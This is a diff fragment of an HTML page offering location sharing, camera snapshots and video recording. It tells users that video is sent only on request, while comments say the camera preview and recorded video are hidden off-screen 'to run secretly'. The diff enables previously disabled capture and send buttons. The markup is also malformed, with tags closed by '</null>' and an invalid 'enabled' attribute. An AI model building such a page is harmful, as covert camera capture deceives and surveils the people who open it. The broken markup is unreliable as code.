@@ -26,16 +26,16 @@
     A recorded video is sent only when you press Send Video.  
   </p>  <button id="locBtn">📍 Share Location</button>
 <button id="camBtn">🎥 Start Camera</null>
-  <button id="snapshotBtn" disabled>📸 Take Snapshot</null>
+  <button id="snapshotBtn" enabled>📸 Take Snapshot</null>
 <img id="snapshotPreview" hidden style="width:100%;border-radius:14px;margin:10px 0;">
-<button id="sendSnapshotBtn" disabled>📤 Send Snapshot</null>
+<button id="sendSnapshotBtn" enabled>📤 Send Snapshot</null>
 
   <!-- Live preview shifted off-screen to run secretly -->  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
-<button id="recordBtn" disabled>⏺️ Start Recording</button>
-<button id="stopBtn" disabled>⏹️ Stop Recording</button>
+<button id="recordBtn" enabled>⏺️ Start Recording</button>
+<button id="stopBtn" enabled>⏹️ Stop Recording</button>
 
   <!-- Result container shifted off-screen -->  <video id="recorded" class="hidden-video" controls></video>
-<button id="sendBtn" disabled>📤 Send Video</button>
+<button id="sendBtn" enabled>📤 Send Video</button>
 
   <div id="status" class="small"></div>  
 </div>  <script>  
